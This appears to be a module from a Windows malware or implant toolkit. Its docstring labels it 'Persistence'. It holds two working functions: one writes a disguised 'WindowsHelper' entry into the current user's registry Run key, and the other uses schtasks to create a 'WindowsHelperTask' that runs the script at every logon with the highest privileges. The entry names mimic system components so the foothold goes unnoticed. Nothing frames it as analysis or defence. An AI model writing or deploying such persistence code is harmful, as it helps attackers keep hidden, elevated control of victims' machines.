"""
Persistence: registry Run key and scheduled task.
"""
import os
import sys
import winreg

def add_registry_run(script_path):
    key = winreg.HKEY_CURRENT_USER
    subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        reg = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(reg, "WindowsHelper", 0, winreg.REG_SZ, script_path)
        winreg.CloseKey(reg)
    except Exception as e:
        print(f"[!] Registry persistence failed: {e}")

def create_scheduled_task(script_path):
    """Create a task to run at user logon (requires schtasks.exe)."""
    task_name = "WindowsHelperTask"
    command = f'schtasks /create /tn "{task_name}" /tr "{sys.executable} {script_path}" /sc onlogon /rl highest /f'
    os.system(command)